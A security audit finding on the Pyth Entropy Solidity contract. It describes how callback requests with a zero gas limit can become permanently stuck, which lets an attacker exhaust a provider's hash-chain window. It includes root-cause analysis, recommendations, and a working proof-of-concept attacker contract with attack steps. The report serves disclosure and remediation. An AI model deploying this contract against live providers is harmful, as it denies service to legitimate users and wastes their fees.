### Title
Entropy `revealWithCallback` Old-Flow Allows Permanently Stuck Requests, Enabling Provider Hash-Chain DoS — (File: `target_chains/ethereum/contracts/contracts/entropy/Entropy.sol`)

---

### Summary

When a provider's `defaultGasLimit` is `0` (the Solidity default for any newly registered provider that has not called `setDefaultGasLimit`), requests submitted via `requestWithCallback` produce a stored `gasLimit10k == 0`. Inside `revealWithCallback`, this triggers the "old flow" which calls `_entropyCallback` directly — without any revert-catching wrapper. If the callback reverts, the entire transaction reverts, including the preceding `clearRequest` call, leaving the request permanently stuck in the mapping. An unprivileged attacker can deploy a contract whose `_entropyCallback` always reverts, submit `maxNumHashes` such requests, and exhaust the provider's hash-chain window, causing every subsequent legitimate request to fail with `LastRevealedTooOld`.

---

### Finding Description

**Root cause — `requestWithCallback` sets `gasLimit10k = 0` for providers with no default gas limit**

`requestWithCallback` unconditionally passes `gasLimit = 0` to `requestV2`: [1](#0-0) 

Inside `requestHelper`, when both `callbackGasLimit == 0` and `providerInfo.defaultGasLimit == 0`, the stored field is left at zero: [2](#0-1) 

Because `defaultGasLimit` is never set during `register`, every freshly registered provider has `defaultGasLimit == 0` by default, making this the common case.

**Root cause — old flow in `revealWithCallback` does not catch callback reverts**

`revealWithCallback` branches on `gasLimit10k != 0`. When `gasLimit10k == 0` the "old flow" is taken: [3](#0-2) 

`clearRequest` is called **before** the callback (checks-effects-interactions pattern). However, if `_entropyCallback` reverts, the EVM unwinds the entire transaction, including `clearRequest`. The request remains in the mapping with `callbackStatus == CALLBACK_NOT_STARTED`. The new flow, by contrast, uses `excessivelySafeCall` and handles failures gracefully: [4](#0-3) 

**Root cause — no alternative path to clear a stuck callback request**

`reveal` (the non-callback path) rejects requests whose `callbackStatus != CALLBACK_NOT_NECESSARY`: [5](#0-4) 

There is no admin or provider function to forcibly delete a stuck request. The only mitigation available to the provider is `advanceProviderCommitment`, which shifts the hash-chain window forward but does not remove stuck entries and can be countered by the attacker repeating the attack.

**Hash-chain exhaustion**

The `LastRevealedTooOld` guard fires when the provider's `sequenceNumber` reaches `currentCommitmentSequenceNumber + maxNumHashes`. Because every stuck request increments `sequenceNumber` without advancing `currentCommitmentSequenceNumber` (the `revealHelper` update is also reverted), an attacker who submits `maxNumHashes` stuck requests exhausts the window entirely: [6](#0-5) 

---

### Impact Explanation

- **Denial of service for all users of the targeted provider**: once the hash-chain window is exhausted, every new `request` / `requestWithCallback` / `requestV2` call reverts with `LastRevealedTooOld`.
- **Permanent stuck state**: the malicious requests remain in the mapping indefinitely; there is no on-chain mechanism to remove them.
- **Sustained DoS**: after the provider calls `advanceProviderCommitment` to recover, the attacker can immediately repeat the attack. The provider must keep advancing their commitment, abandoning in-flight legitimate requests and eroding user trust.
- **Loss of fees for legitimate users**: any legitimate request submitted during the attack window cannot be fulfilled.

---

### Likelihood Explanation

- **Unprivileged entry point**: `requestWithCallback` is a public, permissionless function callable by any contract.
- **Default condition**: `defaultGasLimit == 0` is the Solidity default for any provider that has not explicitly called `setDefaultGasLimit`. This is the common state for newly deployed providers and any provider that reset their limit to zero (which the tests confirm is allowed).
- **Low cost**: the attacker pays `maxNumHashes × fee` per attack cycle. For providers with small `maxNumHashes` or low fees, this is economically viable.
- **No special knowledge required**: the attacker only needs to know the provider address and deploy a contract that reverts in `_entropyCallback`.

---

### Recommendation

1. **Apply `excessivelySafeCall` unconditionally** in `revealWithCallback`, regardless of `gasLimit10k`. Remove the old-flow branch entirely, or ensure the old flow also catches reverts and transitions to `CALLBACK_FAILED` state.
2. **Require `gasLimit10k > 0` for all callback requests**: reject `requestWithCallback` / `requestV2` calls when both the user-supplied gas limit and the provider's `defaultGasLimit` are zero, forcing providers to set a non-zero default before accepting callback requests.
3. **Provide a provider-controlled escape hatch**: allow the provider (or admin) to forcibly clear a request that has been stuck in `CALLBACK_NOT_STARTED` state for longer than a configurable timeout, refunding the fee to the original requester.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@pythnetwork/entropy-sdk-solidity/IEntropyConsumer.sol";
import "@pythnetwork/entropy-sdk-solidity/IEntropy.sol";

/// @notice Malicious requester: always reverts in the entropy callback.
contract MaliciousRequester is IEntropyConsumer {
    IEntropy public entropy;
    address public provider;

    constructor(address _entropy, address _provider) {
        entropy = IEntropy(_entropy);
        provider = _provider;
    }

    // Flood the provider's hash chain with unclearable requests.
    function attack(uint256 count) external payable {
        uint256 fee = entropy.getFee(provider);
        require(msg.value >= fee * count, "insufficient ETH");
        for (uint256 i = 0; i < count; i++) {
            entropy.requestWithCallback{value: fee}(
                provider,
                bytes32(i) // arbitrary user contribution
            );
        }
    }

    // Always reverts → revealWithCallback (old flow) always reverts →
    // clearRequest is undone → request stays stuck in mapping.
    function _entropyCallback(
        uint64, address, bytes32
    ) internal pure override {
        revert("always revert");
    }

    function getEntropy() internal view override returns (address) {
        return address(entropy);
    }
}

// Attack steps:
// 1. Deploy MaliciousRequester pointing at a provider with defaultGasLimit == 0.
// 2. Call attack(maxNumHashes) with enough ETH.
// 3. Provider calls revealWithCallback for each sequence number → all revert.
// 4. currentCommitmentSequenceNumber stays at 0; sequenceNumber == maxNumHashes+1.
// 5. Any new requestWithCallback call reverts with LastRevealedTooOld.
```

### Citations

**File:** target_chains/ethereum/contracts/contracts/entropy/Entropy.sol (L271-283)
```text
            req.gasLimit10k = 0;
        } else {
            // This check does two important things:
            // 1. Providers have a minimum fee set for their defaultGasLimit. If users request less gas than that,
            //    they still pay for the full gas limit. So we may as well give them the full limit here.
            // 2. If a provider has a defaultGasLimit != 0, we need to ensure that all requests have a >0 gas limit
            //    so that we opt-in to the new callback failure state flow.
            req.gasLimit10k = roundTo10kGas(
                callbackGasLimit < providerInfo.defaultGasLimit
                    ? providerInfo.defaultGasLimit
                    : callbackGasLimit
            );
        }
```

**File:** target_chains/ethereum/contracts/contracts/entropy/Entropy.sol (L346-356)
```text
    function requestWithCallback(
        address provider,
        bytes32 userContribution
    ) public payable override returns (uint64) {
        return
            requestV2(
                provider,
                userContribution,
                0 // Passing 0 will assign the request the provider's default gas limit
            );
    }
```

**File:** target_chains/ethereum/contracts/contracts/entropy/Entropy.sol (L432-438)
```text
        EntropyStructsV2.ProviderInfo storage providerInfo = _state.providers[
            req.provider
        ];
        if (providerInfo.currentCommitmentSequenceNumber < req.sequenceNumber) {
            providerInfo.currentCommitmentSequenceNumber = req.sequenceNumber;
            providerInfo.currentCommitment = providerContribution;
        }
```

**File:** target_chains/ethereum/contracts/contracts/entropy/Entropy.sol (L507-515)
```text
        if (
            req.callbackStatus != EntropyStatusConstants.CALLBACK_NOT_NECESSARY
        ) {
            revert EntropyErrors.InvalidRevealCall();
        }

        if (req.requester != msg.sender) {
            revert EntropyErrors.Unauthorized();
        }
```

**File:** target_chains/ethereum/contracts/contracts/entropy/Entropy.sol (L574-600)
```text
        if (
            req.gasLimit10k != 0 &&
            req.callbackStatus == EntropyStatusConstants.CALLBACK_NOT_STARTED
        ) {
            req.callbackStatus = EntropyStatusConstants.CALLBACK_IN_PROGRESS;
            bool success;
            bytes memory ret;
            uint256 startingGas = gasleft();
            (success, ret) = req.requester.excessivelySafeCall(
                // Warning: the provided gas limit below is only an *upper bound* on the gas provided to the call.
                // At most 63/64ths of the current context's gas will be provided to a call, which may be less
                // than the indicated gas limit. (See CALL opcode docs here https://www.evm.codes/?fork=cancun#f1)
                // Consequently, out-of-gas reverts need to be handled carefully to ensure that the callback
                // was truly provided with a sufficient amount of gas.
                uint256(req.gasLimit10k) * TEN_THOUSAND,
                256, // copy at most 256 bytes of the return value into ret.
                abi.encodeWithSelector(
                    IEntropyConsumer._entropyCallback.selector,
                    sequenceNumber,
                    provider,
                    randomNumber
                )
            );
            uint32 gasUsed = SafeCast.toUint32(startingGas - gasleft());
            // Reset status to not started here in case the transaction reverts.
            req.callbackStatus = EntropyStatusConstants.CALLBACK_NOT_STARTED;

```

**File:** target_chains/ethereum/contracts/contracts/entropy/Entropy.sol (L661-681)
```text
        } else {
            // This case uses the checks-effects-interactions pattern to avoid reentry attacks
            address callAddress = req.requester;
            EntropyStructs.Request memory reqV1 = EntropyStructConverter
                .toV1Request(req);
            clearRequest(provider, sequenceNumber);
            // WARNING: DO NOT USE req BELOW HERE AS ITS CONTENTS HAS BEEN CLEARED

            // Check if the requester is a contract account.
            uint len;
            assembly {
                len := extcodesize(callAddress)
            }
            uint256 startingGas = gasleft();
            if (len != 0) {
                IEntropyConsumer(callAddress)._entropyCallback(
                    sequenceNumber,
                    provider,
                    randomNumber
                );
            }
```
